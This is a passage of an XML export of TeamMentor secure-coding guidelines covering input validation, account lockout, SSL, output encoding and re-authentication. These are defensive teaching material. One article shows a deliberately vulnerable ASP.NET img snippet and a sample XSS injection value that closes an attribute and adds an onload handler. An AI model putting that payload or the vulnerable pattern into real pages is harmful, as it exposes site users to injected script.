Data.</strong> Address data has a fairly rich internal structure; the more of this structure your validation routine understands, the better you'll be able to validate the information.&nbsp; Phone numbers can be validated as a string of ten digits, or a variable number of digits beginning with the character '+' if international numbers are allowed.&nbsp; If needed, the country code can be determined and the exact number format looked up.&nbsp; While phone numbers are written several different ways,&nbsp;a canonical representation can be created by stripping all non-numeric characters before validation, something which will save your users time and frustration as they enter data into your site.&nbsp; Street addresses require a little bit more care; if the input is taken in divided into street, city, etc., each field can have a seperate safe character set defined--city names don't need numbers, for instance.&nbsp; Names are fairly straightforward, but are one of the cases where the "'" character is valid input, and thus they must be handled appropriately (as all input should be) at the database level.&nbsp; Also, don't forget to allow accented characters in names and addresses, depending on your current code page.</p></li><li><p><strong>Reference Data. </strong>Data that refers to other things can go through one final step of validation, namely looking up what it refers to to insure that the reference is valid.&nbsp; For instance, postal codes can be validated against a canonical list to ensure correctness, and other aspects of the street address cross-checked with that.&nbsp; In an order management system, item IDs can be&nbsp;checked against a list of valid IDs.</p></li></ul></li></ol><h1>Problem Example</h1><p>An order form for a web store has several fields, specifically, a name, address, phone number, item number, and quantity.&nbsp; Each item is simply added to the database with no data validation and all typecasting handled by the database.&nbsp; Typecasting in the database does not prevent SQL injection and has little effect on out of range data.&nbsp; An attacker can perform numerous attacks, from something as benign as filling the database with garbage data to more actively destructive SQL injection and cross-site scripting attacks.</p><h1>Solution Example</h1><p>An ASP.NET application contains an order for for a web store.&nbsp; Each of the forms fields are validated, giving stronger guarantees about the data gathered.&nbsp; The phone number&nbsp;is validated as a string of ten digits (after stripping all non-numeric characters), or a variable number of digits beginning with the character '+' if international numbers are allowed.&nbsp; </p><p>Validating a name, address, and item number can all be a bit more complicated.&nbsp; The first order of business is determining the legal character set for each case.&nbsp; For names, spaces, upper and lower case letters (including the accented forms for your current codepage), and possible numbrs and periods are enough.&nbsp; Addresses need to add commas, hyphens, and number signs, at a minimum.&nbsp; Validating item numbers may be as simple as casting to an integer and checking that the result is in the right range, or it may mean a more complicated regular expression that checks for internal formatting in a string. </p><p>The last, optional step of data validation is to ensure that the data refers to a valid things.&nbsp; The data should be validated for format first, especially as further checks may require database queries.&nbsp; Item numbers are an obvious thing to check for existence in the DB, and this would normally happen as part of the stored procedure which creates a new order, but names, addresses, and phone numbers can be similarly checked, some times.&nbsp; For example, if the address field is broken up into components, state or province information, zip/post codes, and city names, at a minimum, can all be validated against existing lists.</p><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-582169001" Content_Hash="-1446662243">
    <Metadata>
      <Id>c368e75b-2f2b-4e2f-8014-693826aadb64</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Support Account Management</Title>
      <Category>Authentication</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Application&nbsp;</li></ul><h1>What to Do</h1><p>Ensure that the code enforce password complexity rules and restricts the number of failed logon attempts. </p><h1>Why</h1><p>Restricting the number of failed login attempts helps to counter the threat of dictionary attacks. </p><h1>When</h1><p>The use of strong passwords, restricted login attempts, and other best practice account management policies can be enforced by Windows security policy if your application uses Windows authentication. Otherwise, the application layer is responsible for this. </p><h1>How</h1><h2>Use Account Lockout Policies for End-User Accounts</h2><p>Disable end-user accounts or write events to a log after a set number of failed logon attempts. If you are using Windows authentication, such as NTLM or the Kerberos protocol, these policies can be configured and applied automatically by the operating system. With Forms authentication, these policies are the responsibility of the application and must be incorporated into the application design.</p><p>Be careful that account lockout policies cannot be abused in denial of service attacks. For example, well known default service accounts such as IUSR_MACHINENAME should be replaced by custom account names to prevent an attacker who obtains the Internet Information Services (IIS) Web server name from locking out this critical account.</p><h2>Be Able to Disable Accounts</h2><p>If the system is compromised, being able to deliberately invalidate credentials or disable accounts can prevent additional attacks.</p><p>The use of strong passwords, restricted login attempts, and other best practice account management policies can be enforced by Windows security policy if your application uses Windows authentication. Otherwise, the application layer is responsible for this. Review the following aspects of the account management of your application: </p><ul><li><strong>Does your application enforce strong passwords?</strong> <p>For example, do your ASP.NET Web pages use regular expressions to verify password complexity rules? </p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;If you are using the Membership feature of ASP.NET 2.0, you can configure the providers to enforce strong passwords. For more information, see "<a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/paght000012.asp">How To: Protect Forms Authentication in ASP.NET 2.0</a>".</blockquote></li><li><strong>Do you restrict the number of failed login attempts?</strong> <p>Doing so can help counter the threat of dictionary attacks. </p></li><li><strong>Do you reveal too much information in the event of failure?</strong> <p>Make sure you do not display messages such as "Incorrect password" because this tells malicious users that the user name is correct. This allows them to focus their efforts on cracking passwords. </p></li><li><strong>Do you enforce a periodic change of passwords?</strong> <p>This is recommended because otherwise there is a high probability that a user will not change his or her password, which makes it more vulnerable. </p></li><li><strong>Can you quickly disable accounts in the event of compromise?</strong> <p>If an account is compromised, can you easily disable the account to prevent the attacker from continuing to use the account? </p></li><li><strong>Does your application record login attempts?</strong> <p>Recording failed login attempts is an effective way to detect an attacker who is attempting to break in. </p></li></ul><h1>Additional Resources</h1><ul><li>Design Guidelines for Secure Web Applications <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a> </li><li>Architecture and Design Review for Security <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a> </li><li>Securing Your ASP.NET Application and Web Services <a href="http://msdn2.microsoft.com/en-us/library/aa302435.aspx">http://msdn2.microsoft.com/en-us/library/aa302435.aspx</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="722800127" Content_Hash="-568755984">
    <Metadata>
      <Id>c44d95ec-185a-4d3f-812b-4d3da3eb82a4</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL Between the Web Browser and Web Server When Pages Need to be Encrypted</Title>
      <Category>Communication Security</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use SSL as an encrypted communication channel to protect data sent between servers and web browsers. SSL can be used to help protect communication by encrypting traffic such as account information, billing data, etc.&nbsp;&nbsp; </p><h1>Why</h1><p>If sensitive data is sent between client and server unprotected it may be stolen or modified.&nbsp; SSL can be used to help protect communication between client and server by encrypting network traffic.&nbsp; Encryption will protect against eavesdropping (theft) but an attacker may still blindly modify the data for malicious purposes.&nbsp; Use integrity checking (HMAC) to ensure the data has not been modified.</p><h1>When</h1><p>Use&nbsp;SSL for communication between web browser and web server, when page content&nbsp;needs to be encrypted on the network and the&nbsp;identity&nbsp;of the server needs to be guaranteed. </p><p><strong>Note</strong>: SSL does carry a significant performance penalty in terms of latency that is introduced due to encryption/decryption of pages, so it is important to optimize the number of pages that use SSL. Please see "Guideline: Performance:Use SSL Only for Pages That Require It" for more information.</p><h1>How</h1><p>Use SSL to create a secure encrypted communication channel between browser clients and Web server.</p><p>To use SSL:</p><p>&nbsp;&nbsp; 1. Install a server certificate on the Web server.<br>&nbsp;&nbsp; 2. Install the root certificate authority (CA) certificate from the same authority into the local computer's Trusted Root Certification Authorities certificate store.<br>&nbsp;&nbsp; 3. Use IIS to configure the server to force the use of encryption while accessing Web pages.<br>&nbsp;&nbsp; 4. Design pages with SSL in mind to minimize performance overhead. Optimize pages that use SSL by including less text and simple graphics and partition&nbsp;the site and ensure that only those pages than contain sensitive data use SSL.&nbsp;</p><h1>Problem Example</h1><p>An ASP.NET application allows users to login and maintain their contacts in an online database that is accesible via a web browser. The login&nbsp;credentials are sent in plain text, which allows someone on the network to modify&nbsp;the&nbsp;data sent between&nbsp;a browser and a server or view the contents. The lack of integrity and privacy means that the identity of the user and the identity of the web&nbsp;entity serving out the pages can not be verified.&nbsp;&nbsp;&nbsp;</p><h1>Solution Example</h1><p>An ASP.NET application allows users to login and maintain their contacts in an online database that is accesible via a web browser. When the application is deployed, an SSL certificate is installed on the Web Server. The server is then setup to force users to use encryption while visiting pages containing sensitive information.</p><h1>Additional Resources&nbsp;</h1><ul><li>How To: Use SSL to Secure Communication with SQL Server&nbsp;<a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp</a> </li><li>Using Secure Sockets Layer <a href="http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx">http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx</a> </li><li>Internet Protocol Version 6 <a href="http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx">http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx</a> </li><li>How To: Use SSL between the browser and sdf <a href="http://channel9.msdn.com/wiki/default.aspx/GuidanceLibrary.WebServerandBrowserSSLHowTo">http://channel9.msdn.com/wiki/default.aspx/GuidanceLibrary.WebServerandBrowserSSLHowTo</a>+ <br></li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:de1299b9-854b-4479-9f26-bbc9df38af29">Use SSL or IPSec for Secure Communication Between Entities</a></li><li><a href="ruledisplay:8afce3ed-b29f-4a25-ab8c-0d070383c7ad">Use SSL Between Untrusted Server Applications</a></li><li><a href="ruledisplay:b91cac26-e54a-4041-ad55-b8f55ac6a940">Optimize Pages that use SSL</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="918187836" Content_Hash="-1987412892">
    <Metadata>
      <Id>c463b66b-1319-48c7-9f96-51f1254b4d93</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL When Transmitting Credentials</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use Secure Sockets Layer (SSL) to protect the authentication credentials passed between browser and server.</p><h1>Why</h1><p>Using SSL prevents the credentials from being sniffed or tampered with as they are transmitted over the network. If SSL is not used, user credentials may be compromised by attacks such as a <a href="ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828">Network Credential Sniffing Attack</a> or a <a href="ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197">Phishing Attack</a>. Additionally, use the <a href="ruledisplay:BB960347-F2E9-4926-8B75-ECCEE36D3EE8">Protect Session Cookies</a> guideline to minimize the risk of exposing your application's session cookies to an attacker.</p><h1>When</h1><p>If your application accepts form-based authentication credentials from users.</p><h1>How</h1><p>Using Secure Socket Layer (SSL) over HTTP requires the following steps:</p><ol><li><p><strong>Create a certificate request.</strong> Using the IIS management console, generate an SSL certificate request. This request is then sent to a Certification Authority to be signed. Follow these steps to generate the certificate request.</p><ol><li>Start the <strong>IIS management console</strong>. To do this, click on <strong>Control Panel</strong> -&gt; <strong>Administrative Tools</strong> -&gt; <strong>Internet Information Services</strong>. </li><li>Right click on your application's virtual host and select <strong>Properties</strong>. </li><li>Click on <strong>Server Certificate</strong> under the <strong>Directory Security</strong> tab. </li><li>Select <strong>Create a new certificate</strong> and click <strong>Next</strong>. </li><li>Select <strong>Prepare the request now, but send it later</strong> and click <strong>Next</strong>. </li><li>Provide <strong>your application's FQDN</strong> and the desired bit length for your SSL certificate's encryption key, and then click <strong>Next</strong>. </li><li>Provide <strong>your organization's details</strong> and click <strong>Next</strong>. </li><li>Provide <strong>your application's FQDN</strong> and click <strong>Next</strong>. </li><li>Provide <strong>your organization's location details</strong> and click <strong>Next</strong>. </li><li>Specify the location where you would like the IIS management console to store your application's certificate request. </li><li>Click <strong>Finish</strong> to complete the process.</li></ol></li><li><p><strong>Present the request to a Certification Authority (CA).</strong> If all conditions for obtaining an SSL certificate are met, the CA will produce a new SSL certificate based on the certificate request. Because the requirements for obtaining an SSL certificate depend on the Certification Authority, consult with the Certification Authority in regards to the administrative steps necessary for obtaining such certificate.</p></li><li><p><strong>Install the certificate.</strong> Follow these steps to properly install your application's SSL certificate.</p><ol><li>Start the <strong>IIS management console</strong>. To do this, click on <strong>Control Panel</strong> -&gt; <strong>Administrative Tools</strong> -&gt; <strong>Internet Information Services</strong>. </li><li>Right click on your application's virtual host and select <strong>Properties</strong>. </li><li>Click on <strong>Server Certificate</strong> under the <strong>Directory Security</strong> tab. </li><li>Select <strong>Process the pending request and install the certificate</strong> and click <strong>Next</strong>. </li><li>Specify the location of your application's SSL certificate and click <strong>Next</strong>. </li><li>Click <strong>Finish</strong> to complete the process. </li></ol></li><li><strong>Ensure credentials are sent over SSL. </strong>Place the authentication portion of your application on a dedicated subdomain. Configure the server to accept only HTTPS traffic for the authentication subdomain. Ensure that form posts containing credentials are sent over HTTPS. You can enforce your application's use SSL through several approaches: <ul><li><p><strong>Server configuration.</strong> Using the IIS management console, configure IIS to use SSL for all HTTP requests. Follow these steps to enable this option:</p><ol><li>Start the IIS management console. To do this, click on Control Panel -&gt; Administrative Tools -&gt; Internet Information Services. </li><li>Right click on your application's virtual host and select Properties. </li><li>Select the Directory Security tab. </li><li>Click Edit in the Secure Communications dialog. </li><li>Select Require Secure Channel (SSL) and click OK. </li><li>Click OK to apply the changes and close the property window. </li><li>Browse to http://&lt;your application's FQDN&gt;//. Verify that you receive the following error message: <pre>HTTP 403.4 - Forbidden: SSL required.</pre></li></ol></li><li><p><strong>Programatically.</strong> Use the following considerations to improve your application's use of SSL:</p><ul><li><p><strong>absolute URLs</strong>: Use absolute URL paths when making form requests. Example:</p><pre>&lt;form method="POST" action="https://login.example.com/myapp/login.aspx"&gt;</pre></li><li><p><strong>requireSSL attribute</strong>: In your application's <strong>web.config</strong>, set the secure property by using <strong>requireSSL="true"</strong> on the <strong>&lt;forms&gt;</strong> element as follows:</p><pre>&lt;authentication mode="Forms"&gt;<br>   &lt;forms loginUrl=<a href="https://login.example.com/myapp/login.aspx">https://login.example.com/myapp/login.aspx</a><br>           requireSSL="true"<br>           ...<br>   /&gt;<br>&lt;/authentication&gt;</pre></li></ul></li></ul></li></ol><h1>Problem Example</h1><p>The following snippet is part of an application's web.config. The application uses form based authentication and has configured its &lt;forms&gt; element accordingly. Unfortunately, the &lt;forms&gt; element does not have the requireSSL attribute set to true. Therefore the application fails to enforce the use of SSL when performing form-based authentication.</p><pre>&lt;!-- The forms element does not have a requireSSL attribute --&gt;<br>&lt;forms loginUrl="Secure/Login.aspx"<br>       protection="All"<br>       timeout="00:30:00" <br>       slidingExpiration="true"<br>       name="MyApp"<br>       path="/Secure"<br> /&gt;</pre><h1>Solution Example</h1><p>The following snippet is part of an application's web.config. The application uses form based authentication and has configured its &lt;forms&gt; element accordingly. Because the &lt;forms&gt; element has the requireSSL attribute set to true, all form-based authentication will be performed over an HTTPS connection.</p><pre>&lt;!-- The forms element has the requireSSL attribute set to true --&gt;<br>&lt;forms loginUrl="Secure/Login.aspx"<br>       protection="All"<br>       <strong>requireSSL="true"<br></strong>       timeout="00:30:00"<br>       slidingExpiration="true"<br>       name="MyApp"<br>       path="/Secure"<br> /&gt;</pre><h1>Additional Resources</h1><ul><li>For more information on using SSL with IIS, visit: <a href="http://support.microsoft.com/kb/299875">How to implement SSL in IIS</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:FCB0A4AC-A559-430D-9145-08340EC73FED">Guideline: Protect Sensitive Data Over the Network </a></li><li><a href="ruledisplay:BB960347-F2E9-4926-8B75-ECCEE36D3EE8">Guideline: Protect Session Cookies </a></li><li><a href="ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828">Attack: Network Credential Sniffing Attack</a> </li><li><a href="ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197">Attack: Phishing Attack</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D">Attack: Trust Relationship Attack</a> </li><li><a href="ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D">Attack: Man in the Middle Attack</a> </li><li><a href="ruledisplay:5CDA1EF2-79F3-4167-8E8F-E47E4B0A607A">Checklist Item: SSL is Used when Transmitting Credentials </a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1317913049" Content_Hash="-1014565994">
    <Metadata>
      <Id>c6b2d31d-be63-46d7-ad00-f4ade5a0be4b</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Do Not Echo Untrusted Data Back to the User</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Do not echo input back to the user without first validating and/or encoding the data.&nbsp; Data which can be modified by a user must be treated as untrusted data, regardless of whether or not the user is expected to modify it during normal application use. </p><h1>Why</h1><p>Echoing input directly back to the user makes your application susceptible to malicious input attacks, such as cross-site scripting.&nbsp; If a malicious user can trick someone else into submitting dangerous input in such a way that it will be returned to the victim, or cause the site to store the malicious input they give it so it will be returned to other users, they can exploit vulnerabilities of this class.&nbsp; What constitutes bad input varies widely depending on the system in question.&nbsp; On the web, it normally means some kind of javascript. </p><h1>When</h1><p>Applications should never echo untrusted or user modifiable data back to the user without appropriate encoding. </p><h1>How</h1><p>If you write output that includes user input or data from a shared database or a local file that you do not trust, encode it.&nbsp; Echoing input directly back to the user makes your application vulnerable to cross-site scripting attacks, among other problems.&nbsp; Encoding the data ensures that it is treated as literal text and not as script.&nbsp; ASP.NET's Server.HtmlEncode function is often used to protect against cross-site scripting attacks. However, this function only encodes &lt;&gt;"&amp; characters. This is not sufficient to protect against all possible attacks. For instance, the following ASP.NET code would be vulnerable. </p><pre>&lt;img id='img&lt;%=Server.HtmlEncode(Request.QueryString["userId"]) %&gt;'&nbsp;&nbsp; src='/image.gif' /&gt;</pre><p>An attacker could inject client-side script here by setting <strong>userId </strong>to </p><pre>' onload=alert('xss') alt='</pre><p>The safest solution is to encode all non-alphanumeric characters. Only this type of whitelist solution will catch all possible XSS attacks, regardless of context.&nbsp; This&nbsp;requires more overhead in terms of processing time and size of the resulting HTML, but it is the safest encoding mechanism for all HTML contexts:</p><pre>public static string HtmlEncode(string x)<br>{<br>   if (x == null)<br>   {<br>   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;return x;<br>   }<br>&nbsp;&nbsp;&nbsp;return Regex.Replace(x, "[^a-zA-Z0-9]+", new MatchEvaluator(WebUtility.EncodeMatch));<br>}</pre><p>This is also the approach that the <a href="http://www.microsoft.com/downloads/details.aspx?familyid=9a2b9c92-7ad9-496c-9a89-af08de2e5982&amp;displaylang=en">Microsoft Anti-Cross Site Scripting Library</a>&nbsp;takes.&nbsp; If you are using the Anti-Cross Site Scripting Library, you can use the <strong>Microsoft.Security.ApplicationAntiXSSLibrary.HtmlEncode</strong> method.&nbsp; Similarly, if you write URLs that might contain unsafe characters because they have been constructed from input data or data from a shared database, use <strong>Microsoft.Security.ApplicationAntiXSSLibrary.UrlEncode</strong> to make them safe.&nbsp; </p><p><strong>Note</strong> &nbsp; &nbsp; Make sure that you encode data at the last possible opportunity before the data is returned to the client.&nbsp; If you encode any earlier than this, you may not know the exact context that the data will be used in, and hence the format you need to encode into.&nbsp; Also, early encoding of some data can result in double encoding problems. </p><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="592038925" Content_Hash="-2054419048">
    <Metadata>
      <Id>cd4cadd9-3c87-410c-a504-68b71ba8b11b</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate Input from All Sources</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Treat input from all external sources as untrusted and apply input validation techniques.</p><h1>Why</h1><p>Input that is not validated can lead to cross-site scripting, SQL injection, directory traversals, and other vulnerabilities that would allow an attacker to gain unauthorized access to sensitive data or otherwise compromise an application.</p><h1>When</h1><p>Treat all input as untrusted. If you have established trust boundaries for your application, validate data every time it crosses a trust boundary.</p><h1>How</h1><p>An application can take input via various ways: file system, other software running on the server, etc. Use the following steps to establish a validation strategy:</p><ol><li><p><strong>Identify all sources of input:</strong> Establish your application's trust boundary. The general notion is that all input not generated by your application is untrusted. Enumerate all possible sources of input and make note of the expected input from these sources. An application can have various sources of input. Each of these sources is an entry point to your application and can potentially be used to break your application's security model. Place a content specific validator at each entry point.</p><p>Potential sources of input in a web application typically include:</p><ul><li>URL based parameters </li><li>Form based parameters </li><li>Hidden fields </li><li>Cookies </li><li>HTTP headers </li><li>Data stored on the local file system </li><li>Database </li><li>Other related services</li></ul></li><li><p><strong>Understand the input that your application can handle and process:</strong> Understand the specifics about your application's input. After identifying the different entry points, define the format and type of input that will be provided through each entry point. Build a validator for every format and type of expected input.</p></li><li><p><strong>Create a set of validators:</strong> Centralize your application's validators as it helps strengthen the code by limiting the amount of scattered validation code throughout your application. Place the set of validators on your application's trust boundary. Your application should accept input from the outside world only through its set of validators.</p><p>See the <a href="ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909">Validate Input for Length, Range, Format, and Type</a> guideline for more information on constructing validation routines.</p></li></ol><h1>Problem Example</h1><p>In the following code, a page accepts a query string parameter called <strong>isbn</strong>. The value of this variable is used to look up a book in the database using an unmanaged middle-layer.</p><pre>&lt;script language="C#" runat="server"&gt;<br>    protected void Page_Load(object sender, EventArgs e)<br>    {<br>        String strIsbn = this.Request.QueryString["isbn"];<br>        //lookup isbn in a database using an<br>        //unamanged middle layer<br>    }<br>&lt;/script&gt;</pre><p>In this example, the middle layer may be prone to malicious attacks as the value of ISBN is not validated. he length of the string is not limited, which could lead to a buffer overflow in the unmanaged middle layer, and it may not be in the correct format, which could cause a middle layer string parser to crash, allow for format string attacks, SQL injection, or a host of other issues.</p><h1>Solution Example</h1><p>In the following code, a page accepts a query string parameter called isbn. The value of this variable is used to look up a book in the database using an unmanaged middle layer. The code uses regular expressions to validate the query string string value. This ensures that the value supplied by the client is in the correct format by checking the length of the string and the characters used.</p><pre>&lt;script language="C#" runat="server"&gt;<br>    protected void Page_Load(object sender, EventArgs e)<br>    {<br>        String strIsbn = this.Request.QueryString["isbn"];<br>        if (Regex.IsMatch((strIsbn), @"(?=.{13}$)\d{1,5}([- ])\d{1,7}\1\d{1,6}\1(\d|X)$"))<br>        {<br>            //lookup isbn in a database using an<br>            //unamanged middle layer<br>        }<br>        else<br>        {<br>            //display error<br>        }<br>    }<br>&lt;/script&gt;</pre><h1>Related Items</h1><ul><li><a href="ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909">Guideline: Validate Input for Length, Range, Format, and Type </a></li><li><a href="ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E">Guideline: Filter All User-Supplied Filename and Path Input </a></li><li><a href="ruledisplay:1AB38C50-F31D-4CD8-89B1-CE397E6895E8">Guideline: Encode All Output Data </a></li><li><a href="ruledisplay:58F9B51D-794F-4CFC-B568-7F5E55DEB402">Guideline: Do Not Rely on Client-Side Validation </a></li><li><a href="ruledisplay:F1B74837-9A72-4745-A149-EC5D8C476EB7">Guideline: Validate All Input Passed to Database </a></li><li><a href="ruledisplay:C79CF3EA-F8D7-45D7-A3C5-6370411E500D">Guideline: Validate User's Login Credentials Before Processing Them </a></li><li><a href="ruledisplay:76CC3214-9D3A-4568-B3CB-9E2AEAE560A0">Checklist Item: Input from All Sources is Validated </a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1604014246" Content_Hash="1743858588">
    <Metadata>
      <Id>cdddefd7-2197-48f1-b21e-20c7731c8df2</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Force Re-authentication When Executing Critical Functionality</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>Applications written using Servlets or JSP.</p><h1>What to Do</h1><p>Force the user to re-authenticate when executing security-critical functionality including, but not limited to, change of password, account modifications and critical transactions.</p><h1>Why</h1><p>Forcing the user to re-authenticate verifies the user's decision to execute the given functionality and preserves the application's integrity in the event that a user's account has been compromised via session hijacking.</p><h1>When</h1><p>Force re-authentication prior to executing security-critical functionality.</p><h1>How</h1><p>Follow these steps when forcing re-authentication:</p><ol><li><p><strong>Identify critical functionality.</strong> Evaluate your application's design and requirements and determine what parts and resources of your application are very important to your organization's business model or your application's security architecture. This could include activities such as financial transactions or resetting user passwords.</p></li><li><p><strong>Adopt re-authentication mechanism.</strong> Establish a mechanism that requires the user to verify their authenticity:</p><ul><li><strong>Current password.</strong> The user uses their current password to confirm the identity. This technique ensures that the given user is aware of the action to be performed and holds responsibility for executing it. </li><li><strong>CAPTCHA.</strong> CAPTCHA are mechanisms designed to ensure that a human, not an automated script, is using the system. Using a CAPTCHA should be seen as a way of augmenting a password in this kind of situation, not a way of replacing it. Many CAPTCHA systems embed distorted letters or numbers into displayed images which the user must enter. There are a number of problems with many CAPTCHA systems, so they should not be relied on too heavily. First, many graphical CAPTCHAs can be trivially broken by optical character recognition systems, and ensuring that a CAPTCHA is sufficiently strong to be useful without having too high of a failure rate for real users is difficult. If CAPTCHAs are reused, the attacker can simply record the session IDs of CAPTCHAs with known values and replay them. CAPTCHAs can also be broken by using a man-in-the-middle technique where the image is saved and forwarded to another site controlled by the attacker. An unsuspecting user of that site solves the CAPTCHA and the attacker forwards the answer to the victim site. CAPTCHAs also create accessibility problems for users, as blind and sometimes even color-blind individuals can find them impossible. If you choose to implement a CAPTCHA, be aware of the trade-offs involved and ensure that the system you use is appropriately protected against the attacks you expect to see.</li></ul></li><li><strong>Enforce the re-authentication mechanism.</strong> Once the critical functionality is identified and the re-authentication mechanism is established, enforce the re-authentication mechanism before all security-critical actions.</li></ol><h1>Problem Example</h1><p>The following code allows a user to change their credentials. Unfortunately, the code enters the new credentials into the credentials repository without verifying that it is the actual user changing the credentials.</p><blockquote><pre>public boolean changePassword(String user, char[] oldPass, char[] newPass)<br>{<br>       // The application fails to re-authenticate the user<br>       // Verify that new password meets password requirements<br>       // Update the credential store with the new password<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code allows a user to change their credentials. Before entering the new credentials into the credentials repository, the code verifies that it is the actual user doing the credentials change.</p><blockquote><pre>public boolean changePassword(String user, char[] oldPass, char[] newPass)<br>{<br>       // The application forces re-authentication<br>      if(!validateUser(user, oldPass))<br>      {<br>            return false;<br>      }<br>       // Verify that new password meets password requirements<br>       // Update the credential store with the new password<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>To read more about authentication best practices, see: <a href="http://www.owasp.org/index.php/Guide_to_Authentication">Guide to Authentication</a> available from OWASP. </li><li>For more information on CAPTCHA, see: <a href="http://en.wikipedia.org/wiki/Captcha">CAPTCHA</a> in Wikipedia and the <a href="http://www.captcha.net/">official site</a> for CAPTCHA. </li><li>To learn more about the challenges of implementing CAPTCHA and the approaches to resolve them, see: <a href="http://www.15seconds.com/issue/040202.htm">Fighting Spambots with .NET and AI</a> and <a href="http://www.pcmag.com/article2/0,4149,1306805,00.asp">CAPTCHA-ing the Spammer</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:31529619-FB94-4798-BB29-14AC389F2240">Guideline: Separate Account Administration from the Main Application Interface (Java Web Application)</a> </li><li><a href="ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B">Attack: HTTP Session Hijacking Attack</a> </li><li><a href="ruledisplay:5A2A3106-5532-4CC5-BB2B-0EE25ADD8A19">Checklist Item: Re-authentication is Enforced When Executing Critical Functionality (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-971962148" Content_Hash="-1093170276">
    <Metadata>
